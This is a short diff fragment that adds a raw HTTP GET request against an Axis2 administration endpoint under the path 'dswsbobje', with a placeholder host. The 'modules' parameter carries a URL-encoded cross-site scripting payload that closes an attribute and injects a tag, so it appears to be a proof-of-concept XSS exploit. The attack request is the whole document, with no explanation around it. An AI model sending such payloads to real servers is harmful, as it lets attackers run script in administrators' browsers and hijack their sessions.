@@ -1,0 +1,4 @@
+GET /dswsbobje/axis2-
+     admin/engagingglobally?modules="%3e%20%3cXSS%3e&submit=+Engage+
+     HTTP/1.1
+Host: x.x.x.x:8080
